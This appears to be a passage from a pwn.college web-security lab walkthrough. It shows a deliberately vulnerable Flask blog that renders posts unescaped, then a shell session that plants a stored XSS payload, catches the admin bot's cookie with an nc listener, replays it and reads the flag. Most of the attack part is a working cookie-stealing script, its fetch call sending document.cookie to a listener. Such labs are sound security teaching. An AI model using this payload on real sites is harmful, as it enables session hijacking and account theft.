+    db.execute("UPDATE posts SET published = TRUE WHERE author = ?", [username])
+    return flask.redirect("/")
+
+
+@app.route("/", methods=["GET"])
+def challenge_get():
+    page = "<html><body>\nWelcome to pwnpost, now with users!<hr>\n"
+    username, password = flask.request.cookies.get("auth", "|").split("|")
+    user = db.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
+    if user:
+        page += """
+            <form action=draft method=post>
+              Post:<textarea name=content>Write something!</textarea>
+              <input type=checkbox name=publish>Publish
+              <input type=submit value=Save>
+            </form><br>
+            <form action=publish method=post><input type=submit value="Publish All Drafts"></form>
+            <hr>
+        """
+
+        for post in db.execute("SELECT * FROM posts").fetchall():
+            page += f"""<h2>Author: {post["author"]}</h2>"""
+            if post["published"]:
+                page += post["content"] + "<hr>\n"
+            elif post["author"] == username:
+                page += "<b>YOUR DRAFT POST:</b> " + post["content"] + "<hr>\n"
+            else:
+                page += f"""(Draft post, showing first 12 characters):<br>{post["content"][:12]}<hr>"""
+    else:
+        page += """
+            <form action=login method=post>
+              Username:<input type=text name=username>
+              Password:<input type=text name=password>
+              <input type=submit name=submit value=Login>
+            </form><hr>
+        """
+
+    return page + "</body></html>"
+
+
+app.secret_key = os.urandom(8)
+app.config["SERVER_NAME"] = f"challenge.localhost:80"
+app.run("challenge.localhost", 80)
+hacker@web-security~xss-7:~$ /challenge/server &
+[1] 143
+hacker@web-security~xss-7:~$  * Serving Flask app 'server'
+ * Debug mode: off
+WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
+ * Running on http://challenge.localhost:80
+Press CTRL+C to quit
+nc -lv 1337 &
+[2] 145
+hacker@web-security~xss-7:~$ nc: getnameinfo: Temporary failure in name resolution
+
+hacker@web-security~xss-7:~$ curl -X POST http://challenge.localhost:80/login -d "username=hacker&password=1337" -c hacker
+127.0.0.1 - - [20/May/2026 14:20:54] "POST /login HTTP/1.1" 302 -
+<!doctype html>
+<html lang=en>
+<title>Redirecting...</title>
+<h1>Redirecting...</h1>
+<p>You should be redirected automatically to the target URL: <a href="/">/</a>. If not, click the link.
+hacker@web-security~xss-7:~$ curl -X POST http://challenge.localhost:80/draft --data-urlencode 'content=<script>fetch("http://challenge.localhost:1337?c="+document.cookie)</script>' -d 'publish=true'
+127.0.0.1 - - [20/May/2026 14:22:41] "POST /draft HTTP/1.1" 403 -
+<!doctype html>
+<html lang=en>
+<title>403 Forbidden</title>
+<h1>Forbidden</h1>
+<p>Invalid username or password</p>
+hacker@web-security~xss-7:~$ curl -X POST http://challenge.localhost:80/draft --data-urlencode 'content=<script>fetch("http://challenge.localhost:1337?c="+document.cookie)</script>' -d 'publish=true' -b hacker
+127.0.0.1 - - [20/May/2026 14:22:53] "POST /draft HTTP/1.1" 302 -
+<!doctype html>
+<html lang=en>
+<title>Redirecting...</title>
+<h1>Redirecting...</h1>
+<p>You should be redirected automatically to the target URL: <a href="/">/</a>. If not, click the link.
+hacker@web-security~xss-7:~$ /challenge/victim
+Problem reading geckodriver versions: error sending request for url (https://raw.githubusercontent.com/SeleniumHQ/selenium/trunk/common/geckodriver/geckodriver-support.json). Using latest geckodriver version
+Exception managing firefox: error sending request for url (https://github.com/mozilla/geckodriver/releases/latest)
+Error sending stats to Plausible: error sending request for url (https://plausible.io/api/event)
+Visiting http://challenge.localhost:80/
+127.0.0.1 - - [20/May/2026 14:23:11] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [20/May/2026 14:23:11] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [20/May/2026 14:23:12] "POST /login HTTP/1.1" 302 -
+127.0.0.1 - - [20/May/2026 14:23:12] "GET / HTTP/1.1" 200 -
+Connection received on localhost 34000
+GET /?c=auth=admin|.QXygTN2wyNyETO2EzW} HTTP/1.1
+Host: challenge.localhost:1337
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br, zstd
+Referer: http://challenge.localhost/
+Origin: http://challenge.localhost
+Connection: keep-alive
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-site
+Priority: u=4
+
+Visited! Go check if the attack worked!
+[2]+  Done                       nc -lv 1337
+hacker@web-security~xss-7:~$ curl -b "auth=admin|.QXygTN2wyNyETO2EzW}" http://challenge.localhost:80
+127.0.0.1 - - [20/May/2026 14:23:59] "GET / HTTP/1.1" 200 -
+<html><body>
+Welcome to pwnpost, now with users!<hr>
+
+            <form action=draft method=post>
+              Post:<textarea name=content>Write something!</textarea>
+              <input type=checkbox name=publish>Publish
+              <input type=submit value=Save>
+            </form><br>
+            <form action=publish method=post><input type=submit value="Publish All Drafts"></form>
+            <hr>
+        <h2>Author: admin</h2><b>YOUR DRAFT POST:</b> pwn.college{4DUVA0fPnDMIwsfzsixy-bSgPPc.QXygTN2wyNyETO2EzW}<hr>
+<h2>Author: hacker</h2><script>fetch("http://challenge.localhost:1337?c="+document.cookie)</script><hr>
+</body></html>hacker@web-security~xss-7:~$
